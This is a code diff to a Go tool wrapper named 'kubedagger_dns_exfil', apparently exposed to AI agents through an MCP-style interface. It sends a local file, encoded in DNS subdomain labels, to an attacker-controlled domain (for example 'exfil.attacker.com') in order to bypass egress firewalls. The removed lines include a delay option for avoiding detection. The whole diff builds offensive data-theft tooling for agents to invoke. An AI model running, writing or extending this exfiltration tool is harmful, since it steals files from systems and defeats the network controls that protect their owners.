@@ -11,12 +11,9 @@ import (
 )
 
 type DNSExfilInput struct {
-	Domain    string `json:"domain"`
-	Data      string `json:"data,omitempty"`
-	Source    string `json:"source,omitempty"`
-	Encoding  string `json:"encoding,omitempty"`
-	ChunkSize int    `json:"chunk_size,omitempty"`
-	Delay     int    `json:"delay,omitempty"`
+	File   string `json:"file"`
+	Domain string `json:"domain"`
+	Server string `json:"server,omitempty"`
 }
 
 type DNSExfilTool struct {
@@ -30,40 +27,27 @@ func NewDNSExfil(exec executor.Executor) *DNSExfilTool {
 func (t *DNSExfilTool) Name() string { return "kubedagger_dns_exfil" }
 
 func (t *DNSExfilTool) Description() string {
-	return "Exfiltrate data via DNS queries by encoding payloads in subdomain labels. Bypasses egress firewalls that block direct connections but allow DNS resolution. Uses eBPF to hook DNS resolution and inject encoded data."
+	return "Exfiltrate a file via DNS queries by encoding its contents in subdomain labels sent to an attacker-controlled domain. Bypasses egress firewalls that block direct connections but allow DNS resolution."
 }
 
 func (t *DNSExfilTool) InputSchema() json.RawMessage {
 	return json.RawMessage(`{
 		"type": "object",
 		"properties": {
+			"file": {
+				"type": "string",
+				"description": "Local file path to exfiltrate (required)"
+			},
 			"domain": {
 				"type": "string",
-				"description": "Attacker-controlled domain for DNS exfiltration (e.g., 'exfil.attacker.com')"
+				"description": "Attacker-controlled domain for DNS exfiltration, e.g. 'exfil.attacker.com' (required)"
 			},
-			"data": {
+			"server": {
 				"type": "string",
-				"description": "Data to exfiltrate (or use source for file path)"
-			},
-			"source": {
-				"type": "string",
-				"description": "Source file path to exfiltrate"
-			},
-			"encoding": {
-				"type": "string",
-				"enum": ["base32", "base64", "hex"],
-				"description": "Encoding for DNS labels (default: base32)"
-			},
-			"chunk_size": {
-				"type": "integer",
-				"description": "Bytes per DNS query (max 63 per label)"
-			},
-			"delay": {
-				"type": "integer",
-				"description": "Delay in milliseconds between queries to avoid detection"
+				"description": "DNS server to query (default: 8.8.8.8)"
 			}
 		},
-		"required": ["domain"]
+		"required": ["file", "domain"]
 	}`)
 }
 
@@ -73,31 +57,25 @@ func (t *DNSExfilTool) Execute(ctx context.Context, params json.RawMessage) (*mc
 		return errorResult("invalid input: " + err.Error()), nil
 	}
 
+	if input.File == "" {
+		return errorResult("file is required"), nil
+	}
+	if input.Domain == "" {
+		return errorResult("domain is required"), nil
+	}
+	if err := validateSafeString(input.File, "file"); err != nil {
+		return errorResult(err.Error()), nil
+	}
 	if err := validateSafeString(input.Domain, "domain"); err != nil {
 		return errorResult(err.Error()), nil
 	}
-	if err := validateSafeString(input.Data, "data"); err != nil {
-		return errorResult(err.Error()), nil
-	}
-	if err := validateSafeString(input.Source, "source"); err != nil {
+	if err := validateSafeString(input.Server, "server"); err != nil {
 		return errorResult(err.Error()), nil
 	}
 
-	args := []string{"dns-exfil", "--domain", input.Domain}
-	if input.Data != "" {
-		args = append(args, "--data", input.Data)
-	}
-	if input.Source != "" {
-		args = append(args, "--source", input.Source)
-	}
-	if input.Encoding != "" {
-		args = append(args, "--encoding", input.Encoding)
-	}
-	if input.ChunkSize > 0 {
-		args = append(args, "--chunk-size", fmt.Sprintf("%d", input.ChunkSize))
-	}
-	if input.Delay > 0 {
-		args = append(args, "--delay", fmt.Sprintf("%d", input.Delay))
+	args := []string{"dns_exfil", "--file", input.File, "--domain", input.Domain}
+	if input.Server != "" {
+		args = append(args, "--server", input.Server)
 	}
 
 	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
@@ -106,7 +84,7 @@ func (t *DNSExfilTool) Execute(ctx context.Context, params json.RawMessage) (*mc
 		if result != nil {
 			stderr = string(result.Stderr)
 		}
-		return errorResult(fmt.Sprintf("kubedagger dns-exfil failed: %s\n%s", err.Error(), stderr)), nil
+		return errorResult(fmt.Sprintf("kubedagger dns_exfil failed: %s\n%s", err.Error(), stderr)), nil
 	}
 
 	output := strings.TrimSpace(string(result.Stdout))
